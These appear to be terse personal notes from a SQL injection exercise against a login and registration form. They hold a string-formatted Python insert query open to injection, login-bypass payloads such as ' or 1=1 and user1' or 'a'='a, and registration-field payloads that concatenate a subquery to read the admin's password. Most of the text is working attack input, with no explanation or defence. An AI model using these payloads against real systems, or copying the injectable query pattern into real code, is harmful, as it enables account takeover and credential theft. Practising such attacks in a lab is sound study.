' -> enter both use + pass
', a 

sql request
select username from users where username='{username}' and password='{password}';
username = user1' or 'a'='a
password=password1
admin
' or 1=1 
admin' 
 self.cursor.execute(f"insert into users (username, password) values ('{username}', '{password}');")
register with admin's password

username
3','+ (select password from users where username='admin') + 'test
a'+ (select password from users where username='admin') + '
